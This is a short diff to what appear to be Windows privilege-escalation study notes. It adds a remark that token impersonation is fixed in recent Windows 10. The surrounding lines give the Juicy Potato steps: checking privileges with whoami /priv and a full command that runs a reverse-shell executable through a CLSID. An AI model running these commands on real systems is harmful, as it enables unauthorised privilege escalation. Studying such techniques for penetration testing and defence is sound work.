@@ -96,6 +96,7 @@ Hot Potato:
 
 Token Impersonation:
 	- If we get a reverse shell from a service account, then chances of this attack will be higher.
+	- Fixed in latest versions of windows 10.
 	- Command to check if SeImpersonatePrivelege Enabled or not and SeAssignPrimaryTokenPrivelege is Disabled: whoami /priv
 	- We need to have available port and valid CLS ID to let this attack run succesfully. List is available on Juicy potato github and there is PS script as well to enumerate this.
 	- Command: Juicypotato.exe -l 1337 -p C:\Privesc\rev.exe -t * -c {CLS-ID} 
